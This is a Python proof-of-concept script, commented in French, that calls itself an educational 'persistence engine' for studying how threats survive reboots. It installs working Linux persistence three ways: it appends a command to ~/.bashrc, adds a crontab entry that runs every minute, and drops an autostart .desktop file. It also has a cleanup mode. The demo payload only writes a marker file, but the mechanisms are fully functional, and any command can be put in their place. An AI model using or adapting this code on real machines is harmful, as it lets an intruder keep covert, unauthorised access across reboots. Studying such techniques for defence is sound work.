#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dossier: Ware - Étape 07: Persistence Engine (PoC Éducatif)
Intention: Al-Muqit (Étudier comment une menace survit aux redémarrages)
Description: Simule l'installation de mécanismes de persistance Linux :
             - Injection dans ~/.bashrc
             - Ajout d'une tâche crontab
             - Dépôt d'un fichier .desktop dans ~/.config/autostart/
Conformité: Flake8 / 88 caractères maximum.
"""

import subprocess
from pathlib import Path

PAYLOAD_MARKER = "# [WARE-PERSISTENCE]"
FAKE_PAYLOAD = "echo '[WARE] Persistance active' > /tmp/.ware_alive"
CRON_COMMENT = "# ware-persistence-poc"
AUTOSTART_APP = "ware-persistence"


def inject_bashrc():
    """Injecte une ligne de persistance dans ~/.bashrc."""
    bashrc = Path.home() / ".bashrc"
    content = bashrc.read_text(encoding="utf-8") if bashrc.exists() else ""
    if PAYLOAD_MARKER in content:
        print("[Persistence] ~/.bashrc : déjà injecté.")
        return
    with open(bashrc, "a", encoding="utf-8") as f:
        f.write(f"\n{PAYLOAD_MARKER}\n{FAKE_PAYLOAD}\n")
    print("[Persistence] ~/.bashrc : injection réussie.")


def inject_crontab():
    """Ajoute une tâche crontab toutes les minutes."""
    result = subprocess.run(
        ["crontab", "-l"], capture_output=True, text=True
    )
    existing = result.stdout if result.returncode == 0 else ""
    if CRON_COMMENT in existing:
        print("[Persistence] crontab : déjà injecté.")
        return
    new_entry = (
        f"\n{CRON_COMMENT}\n"
        f"* * * * * {FAKE_PAYLOAD}\n"
    )
    new_cron = existing + new_entry
    proc = subprocess.run(
        ["crontab", "-"],
        input=new_cron, text=True, capture_output=True
    )
    if proc.returncode == 0:
        print("[Persistence] crontab : injection réussie.")
    else:
        print(f"[Persistence] crontab erreur : {proc.stderr.strip()}")


def inject_autostart():
    """Crée un fichier .desktop dans ~/.config/autostart/."""
    autostart_dir = Path.home() / ".config" / "autostart"
    autostart_dir.mkdir(parents=True, exist_ok=True)
    desktop_file = autostart_dir / f"{AUTOSTART_APP}.desktop"
    if desktop_file.exists():
        print("[Persistence] autostart : déjà présent.")
        return
    content = (
        "[Desktop Entry]\n"
        f"Name={AUTOSTART_APP}\n"
        "Type=Application\n"
        f"Exec=/bin/bash -c '{FAKE_PAYLOAD}'\n"
        "Hidden=false\n"
        "NoDisplay=false\n"
        "X-GNOME-Autostart-enabled=true\n"
    )
    desktop_file.write_text(content, encoding="utf-8")
    print(f"[Persistence] autostart : {desktop_file} créé.")


def clean_all():
    """Supprime tous les artefacts de persistance (nettoyage post-démo)."""
    # ~/.bashrc
    bashrc = Path.home() / ".bashrc"
    if bashrc.exists():
        lines = bashrc.read_text(encoding="utf-8").splitlines()
        cleaned = []
        skip = False
        for line in lines:
            if PAYLOAD_MARKER in line:
                skip = True
            if skip and line.strip() == "":
                skip = False
                continue
            if not skip:
                cleaned.append(line)
        bashrc.write_text("\n".join(cleaned) + "\n", encoding="utf-8")
        print("[Clean] ~/.bashrc nettoyé.")

    # crontab
    result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
    if result.returncode == 0 and CRON_COMMENT in result.stdout:
        lines = result.stdout.splitlines()
        cleaned = [
            line for line in lines
            if CRON_COMMENT not in line and FAKE_PAYLOAD not in line
        ]
        subprocess.run(
            ["crontab", "-"], input="\n".join(cleaned) + "\n", text=True
        )
        print("[Clean] crontab nettoyé.")

    # autostart
    desktop_file = (
        Path.home() / ".config" / "autostart" / f"{AUTOSTART_APP}.desktop"
    )
    if desktop_file.exists():
        desktop_file.unlink()
        print("[Clean] autostart supprimé.")


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "clean":
        clean_all()
    else:
        print("[Persistence] Installation des mécanismes de persistance...\n")
        inject_bashrc()
        inject_crontab()
        inject_autostart()
        print(
            "\n[!] Pour nettoyer : python3 persistence_poc.py clean"
        )
